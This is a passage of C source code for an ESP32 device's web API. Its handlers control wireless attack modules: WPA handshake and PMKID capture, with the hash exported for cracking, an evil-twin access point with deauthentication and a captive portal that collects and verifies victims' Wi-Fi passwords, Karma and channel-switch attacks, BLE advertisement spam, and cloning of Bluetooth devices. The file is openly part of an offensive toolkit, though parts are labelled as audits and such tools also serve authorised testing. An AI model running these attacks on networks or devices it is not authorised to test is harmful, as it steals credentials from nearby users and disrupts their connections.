        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Stopping Handshake capture");
    attack_handshake_stop();
    return send_success_response(req);
}

static esp_err_t handshake_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = attack_handshake_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "running", false);
        cJSON_AddNumberToObject(fallback, "eapol_count", 0);
        cJSON_AddNumberToObject(fallback, "eapol_required", 4);
        cJSON_AddStringToObject(fallback, "status", "idle");
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t handshake_pcap_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    size_t pcap_size = attack_handshake_get_pcap_size();
    const uint8_t *pcap_data = attack_handshake_get_pcap_data();

    if (!pcap_data || pcap_size == 0) {
        httpd_resp_send_err(req, HTTPD_404_NOT_FOUND, "No PCAP data available");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/octet-stream");
    httpd_resp_set_hdr(req, "Content-Disposition",
                       "attachment; filename=\"handshake.pcap\"");
    httpd_resp_send(req, (const char *)pcap_data, pcap_size);
    return ESP_OK;
}

/* ── PMKID Attack Handlers ── */

static esp_err_t pmkid_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    if (!fill_ap_record_from_json(root, &pmkid_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    attack_config_t attack_config = {0};
    attack_config.target_count = 1;
    attack_config.ap_records[0] = &pmkid_target;
    
    ESP_LOGI(TAG, "Starting PMKID attack on SSID: %s", pmkid_target.ssid);
    attack_pmkid_start(&attack_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t pmkid_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_pmkid_stop();
    return send_success_response(req);
}

static esp_err_t pmkid_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    char *json = attack_pmkid_get_status_json();
    if (json) {
        httpd_resp_sendstr(req, json);
        free(json);
    } else {
        httpd_resp_sendstr(req, "{\"running\":false,\"captured\":false}");
    }
    return ESP_OK;
}

static esp_err_t pmkid_hash_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    if (!attack_pmkid_has_capture()) {
        cJSON *root = cJSON_CreateObject();
        cJSON_AddBoolToObject(root, "captured", false);
        return send_json_response(req, root);
    }
    cJSON *root = cJSON_CreateObject();
    cJSON_AddBoolToObject(root, "captured", true);
    cJSON_AddStringToObject(root, "ssid", attack_pmkid_get_ssid());
    char bssid_str[18];
    const uint8_t *b = attack_pmkid_get_bssid();
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             b[0], b[1], b[2], b[3], b[4], b[5]);
    cJSON_AddStringToObject(root, "bssid", bssid_str);
    cJSON_AddStringToObject(root, "hash", attack_pmkid_get_hash());
    cJSON_AddNumberToObject(root, "hashcat_mode", 16800);
    return send_json_response(req, root);
}

/* ── Probe Sniffer Handlers ── */

static esp_err_t probe_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    ESP_LOGI(TAG, "Starting Probe Sniffer");
    attack_probe_start(NULL);

    return send_success_response(req);
}

static esp_err_t probe_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ESP_LOGI(TAG, "Stopping Probe Sniffer");
    attack_probe_stop();
    return send_success_response(req);
}

static esp_err_t probe_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, attack_probe_get_status_json());
    return ESP_OK;
}

static esp_err_t probe_ghosts_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    probe_ghost_entry_t entries[PROBE_MAX_GHOSTS];
    int count = 0;
    attack_probe_get_ghosts(entries, PROBE_MAX_GHOSTS, &count);

    cJSON *root = cJSON_CreateObject();
    cJSON *arr = cJSON_CreateArray();
    for (int i = 0; i < count; i++) {
        cJSON *item = cJSON_CreateObject();
        cJSON_AddStringToObject(item, "ssid", entries[i].ssid);
        cJSON_AddNumberToObject(item, "rssi", entries[i].rssi);
        cJSON_AddNumberToObject(item, "probes", entries[i].probe_count);
        cJSON_AddNumberToObject(item, "channel", entries[i].channel);
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 entries[i].bssid[0], entries[i].bssid[1], entries[i].bssid[2],
                 entries[i].bssid[3], entries[i].bssid[4], entries[i].bssid[5]);
        cJSON_AddStringToObject(item, "bssid", bssid_str);
        cJSON_AddItemToArray(arr, item);
    }
    cJSON_AddItemToObject(root, "ghosts", arr);
    cJSON_AddNumberToObject(root, "count", count);

    char *json = cJSON_PrintUnformatted(root);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, json);
    free(json);
    cJSON_Delete(root);
    return ESP_OK;
}

static esp_err_t probe_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_probe_clear_ghosts();
    return send_success_response(req);
}

/* ── Evil Twin Handlers ── */

static esp_err_t eviltwin_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    
    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    
    if (!fill_ap_record_from_json(root, &evil_twin_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    
    cJSON *portal_json   = cJSON_GetObjectItem(root, "use_captive_portal");
    cJSON *deauth_json   = cJSON_GetObjectItem(root, "use_deauth");
    cJSON *verify_json   = cJSON_GetObjectItem(root, "verify_passwords");
    cJSON *interval_json = cJSON_GetObjectItem(root, "deauth_interval_sec");
    
    eviltwin_config_t et_config = {0};
    strncpy(et_config.ssid, (char *)evil_twin_target.ssid, EVILTWIN_MAX_SSID_LEN - 1);
    et_config.channel = evil_twin_target.primary;
    memcpy(et_config.bssid, evil_twin_target.bssid, 6);
    et_config.use_captive_portal = cJSON_IsBool(portal_json) ? portal_json->valueint : true;
    et_config.use_deauth         = cJSON_IsBool(deauth_json) ? deauth_json->valueint : true;
    et_config.verify_passwords   = cJSON_IsBool(verify_json) ? verify_json->valueint : true;
    et_config.deauth_interval_sec = cJSON_IsNumber(interval_json) ? interval_json->valueint : 15;
    if (et_config.deauth_interval_sec < 5) et_config.deauth_interval_sec = 5;
    if (et_config.deauth_interval_sec > 120) et_config.deauth_interval_sec = 120;
    
    ESP_LOGI(TAG, "Starting Evil Twin attack on SSID: %s (portal=%d deauth=%d verify=%d interval=%d)",
             et_config.ssid, et_config.use_captive_portal, et_config.use_deauth,
             et_config.verify_passwords, et_config.deauth_interval_sec);
    
    attack_eviltwin_start(&et_config);
    
    cJSON_Delete(root);
    return send_success_response(req);
}

/* ── Karma / CSA / PMF / WPS / EAP Audit Handlers ── */

static esp_err_t karma_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[256] = {0};
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    bool send_beacons = true;
    bool respond_broadcast = false;
    uint16_t timeout_sec = KARMA_TIMEOUT_SEC;
    if (ret > 0) {
        content[ret] = '\0';
        cJSON *root = cJSON_Parse(content);
        if (root) {
            cJSON *jb = cJSON_GetObjectItem(root, "send_beacons");
            cJSON *jrb = cJSON_GetObjectItem(root, "respond_broadcast");
            cJSON *jt = cJSON_GetObjectItem(root, "timeout_sec");
            if (cJSON_IsBool(jb)) send_beacons = jb->valueint;
            if (cJSON_IsBool(jrb)) respond_broadcast = jrb->valueint;
            if (cJSON_IsNumber(jt)) timeout_sec = (uint16_t)jt->valueint;
            cJSON_Delete(root);
        }
    }
    esp_err_t err = attack_karma_start(respond_broadcast, send_beacons, timeout_sec);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Radio busy or already running");
        return ESP_FAIL;
    }
    return send_success_response(req);
}

static esp_err_t karma_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_karma_stop();
    return send_success_response(req);
}

static esp_err_t karma_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    return send_json_response(req, attack_karma_get_status_json());
}

static esp_err_t karma_results_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    return send_json_response(req, attack_karma_get_results_json());
}

static esp_err_t karma_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_karma_clear();
    return send_success_response(req);
}

static bool parse_mac_field(cJSON *root, const char *key, uint8_t out[6], bool optional)
{
    cJSON *j = cJSON_GetObjectItem(root, key);
    if (!cJSON_IsString(j) || j->valuestring == NULL) {
        if (optional) {
            memset(out, 0xFF, 6);
            return true;
        }
        return false;
    }
    return parse_bssid(j->valuestring, out);
}

static esp_err_t csa_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[400] = {0};
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing body");
        return ESP_FAIL;
    }
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }
    if (!fill_ap_record_from_json(root, &csa_target, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing or invalid target");
        return ESP_FAIL;
    }
    attack_csa_config_t cfg = {0};
    cfg.target = csa_target;
    cJSON *jn = cJSON_GetObjectItem(root, "new_channel");
    cJSON *jc = cJSON_GetObjectItem(root, "count");
    cJSON *jm = cJSON_GetObjectItem(root, "mode");
    cJSON *ja = cJSON_GetObjectItem(root, "use_action");
    cJSON *jb = cJSON_GetObjectItem(root, "use_beacon");
    cJSON *ji = cJSON_GetObjectItem(root, "interval_ms");
    cJSON *jt = cJSON_GetObjectItem(root, "timeout_sec");
    cfg.new_channel = cJSON_IsNumber(jn) ? (uint8_t)jn->valueint : 1;
    cfg.count = cJSON_IsNumber(jc) ? (uint8_t)jc->valueint : 1;
    cfg.mode = cJSON_IsNumber(jm) ? (uint8_t)jm->valueint : 0;
    cfg.use_action = cJSON_IsBool(ja) ? ja->valueint : true;
    cfg.use_beacon = cJSON_IsBool(jb) ? jb->valueint : true;
    cfg.interval_ms = cJSON_IsNumber(ji) ? (uint16_t)ji->valueint : 50;
    cfg.timeout_sec = cJSON_IsNumber(jt) ? (uint16_t)jt->valueint : CSA_TIMEOUT_SEC;
    if (!parse_mac_field(root, "dest", cfg.dest_mac, true)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid dest MAC");
        return ESP_FAIL;
    }
    cJSON_Delete(root);

    esp_err_t err = attack_csa_start(&cfg);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "CSA start failed");
        return ESP_FAIL;
    }
    return send_success_response(req);
}

static esp_err_t csa_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_csa_stop();
    return send_success_response(req);
}

static esp_err_t csa_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    return send_json_response(req, attack_csa_get_status_json());
}

static esp_err_t pmf_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    uint8_t channel = 0;
    uint16_t timeout_sec = PMF_TIMEOUT_SEC;
    char content[200] = {0};
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret > 0) {
        content[ret] = '\0';
        cJSON *root = cJSON_Parse(content);
        if (root) {
            cJSON *jc = cJSON_GetObjectItem(root, "channel");
            cJSON *jt = cJSON_GetObjectItem(root, "timeout_sec");
            if (cJSON_IsNumber(jc)) channel = (uint8_t)jc->valueint;
            if (cJSON_IsNumber(jt)) timeout_sec = (uint16_t)jt->valueint;
            cJSON_Delete(root);
        }
    }
    esp_err_t err = attack_pmf_start(channel, timeout_sec);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "PMF audit start failed");
        return ESP_FAIL;
    }
    return send_success_response(req);
}

static esp_err_t pmf_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_pmf_stop();
    return send_success_response(req);
}

static esp_err_t pmf_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    return send_json_response(req, attack_pmf_get_status_json());
}

static esp_err_t pmf_results_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    return send_json_response(req, attack_pmf_get_results_json());
}

static esp_err_t pmf_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_pmf_clear();
    return send_success_response(req);
}

static esp_err_t wps_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    uint8_t channel = 0;
    uint16_t timeout_sec = WPS_TIMEOUT_SEC;
    char content[200] = {0};
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret > 0) {
        content[ret] = '\0';
        cJSON *root = cJSON_Parse(content);
        if (root) {
            cJSON *jc = cJSON_GetObjectItem(root, "channel");
            cJSON *jt = cJSON_GetObjectItem(root, "timeout_sec");
            if (cJSON_IsNumber(jc)) channel = (uint8_t)jc->valueint;
            if (cJSON_IsNumber(jt)) timeout_sec = (uint16_t)jt->valueint;
            cJSON_Delete(root);
        }
    }
    esp_err_t err = attack_wps_start(channel, timeout_sec);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "WPS audit start failed");
        return ESP_FAIL;
    }
    return send_success_response(req);
}

static esp_err_t wps_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_wps_stop();
    return send_success_response(req);
}

static esp_err_t wps_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    return send_json_response(req, attack_wps_get_status_json());
}

static esp_err_t wps_results_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    return send_json_response(req, attack_wps_get_results_json());
}

static esp_err_t wps_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_wps_clear();
    return send_success_response(req);
}

static esp_err_t eap_audit_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[320] = {0};
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    uint16_t timeout_sec = EAP_AUDIT_TIMEOUT_SEC;
    bool has_target = false;
    if (ret > 0) {
        content[ret] = '\0';
        cJSON *root = cJSON_Parse(content);
        if (root) {
            cJSON *jt = cJSON_GetObjectItem(root, "timeout_sec");
            if (cJSON_IsNumber(jt)) timeout_sec = (uint16_t)jt->valueint;
            if (cJSON_GetObjectItem(root, "bssid") && cJSON_GetObjectItem(root, "channel")) {
                if (fill_ap_record_from_json(root, &eap_audit_target, false)) {
                    has_target = true;
                }
            }
            cJSON_Delete(root);
        }
    }
    esp_err_t err = attack_eap_audit_start(has_target ? &eap_audit_target : NULL, timeout_sec);
    if (err != ESP_OK) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "EAP audit start failed");
        return ESP_FAIL;
    }
    return send_success_response(req);
}

static esp_err_t eap_audit_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_eap_audit_stop();
    return send_success_response(req);
}

static esp_err_t eap_audit_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    return send_json_response(req, attack_eap_audit_get_status_json());
}

static esp_err_t eap_audit_results_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    return send_json_response(req, attack_eap_audit_get_results_json());
}

static esp_err_t eap_audit_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    attack_eap_audit_clear();
    return send_success_response(req);
}

static esp_err_t eviltwin_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_eviltwin_stop();
    return send_success_response(req);
}

static esp_err_t eviltwin_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "application/json");
    httpd_resp_sendstr(req, attack_eviltwin_get_status_json());
    return ESP_OK;
}

static esp_err_t eviltwin_passwords_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    eviltwin_password_entry_t entries[EVILTWIN_MAX_PASSWORDS];
    int count = 0;
    attack_eviltwin_get_captured_passwords(entries, EVILTWIN_MAX_PASSWORDS, &count);

    eviltwin_status_t st;
    attack_eviltwin_get_status(&st);

    cJSON *root = cJSON_CreateObject();
    if (root == NULL) {
        return send_json_response(req, root);
    }

    cJSON *pw_array = cJSON_CreateArray();
    if (pw_array == NULL) {
        cJSON_Delete(root);
        return send_json_response(req, NULL);
    }

    for (int i = 0; i < count; i++) {
        cJSON *entry = cJSON_CreateObject();
        if (entry == NULL) continue;
        cJSON_AddStringToObject(entry, "password", entries[i].password);
        cJSON_AddBoolToObject(entry, "verified", entries[i].verified);
        cJSON_AddNumberToObject(entry, "attempt_count", entries[i].attempt_count);
        cJSON_AddItemToArray(pw_array, entry);
    }

    cJSON_AddItemToObject(root, "passwords", pw_array);
    cJSON_AddNumberToObject(root, "total", count);
    if (st.password_verified) {
        cJSON_AddStringToObject(root, "verified_password", st.verified_password);
    }

    esp_err_t err = send_json_response(req, root);
    return err;
}

static esp_err_t eviltwin_clear_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_eviltwin_clear_passwords();
    return send_success_response(req);
}

/* ================================================================== */
/*  BLE HANDLERS                                                       */
/* ================================================================== */

static esp_err_t ble_spam_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;

    cJSON *device_type_json = cJSON_GetObjectItem(root, "device_type");
    cJSON *delay_json = cJSON_GetObjectItem(root, "delay_ms");

    if (!cJSON_IsNumber(device_type_json) || !cJSON_IsNumber(delay_json)) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "device_type and delay_ms are required");
        return ESP_FAIL;
    }

    int device_type = device_type_json->valueint;
    int delay_ms = delay_json->valueint;

    if (device_type < 1 || device_type > 25) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "device_type must be between 1 and 25");
        return ESP_FAIL;
    }
    if (delay_ms < 0 || delay_ms > 2000) {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "delay_ms must be between 0 and 2000");
        return ESP_FAIL;
    }

    attack_bt_spam_init();

    bt_spam_config_t config = {0};
    config.device_type = device_type;
    config.delay_ms = delay_ms;
    attack_bt_spam_start(&config);

    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_spam_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_bt_spam_stop();
    return send_success_response(req);
}

static esp_err_t ble_spam_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    cJSON *status = attack_bt_spam_get_status_json();
    return send_json_response(req, status);
}

static esp_err_t ble_spoof_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    char content[200];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';
    cJSON *root = cJSON_Parse(content);
    if (!root) return ESP_FAIL;
    cJSON *name = cJSON_GetObjectItem(root, "name");
    const char *sname = cJSON_IsString(name) ? name->valuestring : NULL;
    ble_spoof_start(sname);
    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_spoof_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    ble_spoof_stop();
    return send_success_response(req);
}

static esp_err_t ble_spoof_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }
    cJSON *status = ble_spoof_get_status_json();
    return send_json_response(req, status);
}

static esp_err_t ble_spoof_clone_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    char content[512];
    int ret = httpd_req_recv(req, content, sizeof(content) - 1);
    if (ret <= 0) return ESP_FAIL;
    content[ret] = '\0';

    cJSON *root = cJSON_Parse(content);
    if (!root) {
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
        return ESP_FAIL;
    }

    cJSON *adv_data_json    = cJSON_GetObjectItem(root, "adv_data");
    cJSON *name_json        = cJSON_GetObjectItem(root, "name");
    cJSON *custom_name_json = cJSON_GetObjectItem(root, "custom_name");
    cJSON *addr_json        = cJSON_GetObjectItem(root, "addr");
    cJSON *clone_opt_json   = cJSON_GetObjectItem(root, "clone_opt");

    const char *device_name  = cJSON_IsString(name_json) ? name_json->valuestring : NULL;
    const char *custom_name  = cJSON_IsString(custom_name_json) ? custom_name_json->valuestring : NULL;
    const char *addr_str     = cJSON_IsString(addr_json) ? addr_json->valuestring : NULL;
    const char *adv_hex      = cJSON_IsString(adv_data_json) ? adv_data_json->valuestring : NULL;
    const char *clone_opt    = cJSON_IsString(clone_opt_json) ? clone_opt_json->valuestring : "full";

    ESP_LOGI(TAG, "BLE clone request: name='%s' addr='%s' adv=%s custom='%s' opt=%s",
             device_name ? device_name : "(null)",
             addr_str ? addr_str : "(null)",
             adv_hex ? "provided" : "none",
             custom_name ? custom_name : "(null)",
             clone_opt);

    if (adv_hex != NULL && strlen(adv_hex) > 0) {
        size_t hex_len = strlen(adv_hex);
        if (hex_len % 2 != 0 || hex_len / 2 > 31) {
            cJSON_Delete(root);
            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                                "adv_data must be even-length hex, max 62 chars (31 bytes)");
            return ESP_FAIL;
        }

        uint8_t raw_adv[31];
        size_t  raw_len = hex_len / 2;
        for (size_t i = 0; i < raw_len; i++) {
            unsigned int byte;
            if (sscanf(adv_hex + i * 2, "%02x", &byte) != 1) {
                cJSON_Delete(root);
                httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                                    "adv_data contains invalid hex");
                return ESP_FAIL;
            }
            raw_adv[i] = (uint8_t)byte;
        }

        ble_spoof_clone_profile_t profile;
        memset(&profile, 0, sizeof(profile));
        ble_spoof_parse_adv(raw_adv, (uint8_t)raw_len, &profile);

        memcpy(profile.raw_adv, raw_adv, raw_len);
        profile.raw_adv_len = (uint8_t)raw_len;

        if (strcmp(clone_opt, "nameonly") == 0) {
            profile.svc_uuids_16_count = 0;
            profile.svc_uuids_128_count = 0;
            profile.has_appearance = false;
            profile.has_tx_power = false;
            profile.has_mfr_data = false;
            profile.raw_adv_len = 0;
        } else if (strcmp(clone_opt, "stealth") == 0) {
            profile.name[0] = '\0';
            profile.raw_adv_len = 0;
        }

        if (custom_name && strlen(custom_name) > 0) {
            strncpy(profile.name, custom_name, BLE_SPOOF_MAX_NAME_LEN);
            profile.name[BLE_SPOOF_MAX_NAME_LEN] = '\0';
            profile.raw_adv_len = 0;
        }

        ble_spoof_clone_start(&profile);

    } else if (device_name != NULL || custom_name != NULL) {
        ble_spoof_clone_profile_t profile;
        memset(&profile, 0, sizeof(profile));
        const char *use_name = (custom_name && strlen(custom_name) > 0)
                                ? custom_name : device_name;
        if (use_name) {
            strncpy(profile.name, use_name, BLE_SPOOF_MAX_NAME_LEN);
            profile.name[BLE_SPOOF_MAX_NAME_LEN] = '\0';
        }
        profile.flags = 0x06;
        ble_spoof_clone_start(&profile);

    } else {
        cJSON_Delete(root);
        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
                            "Provide at least 'name', 'adv_data', or 'custom_name'");
        return ESP_FAIL;
    }

    cJSON_Delete(root);
    return send_success_response(req);
}

static esp_err_t ble_connect_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
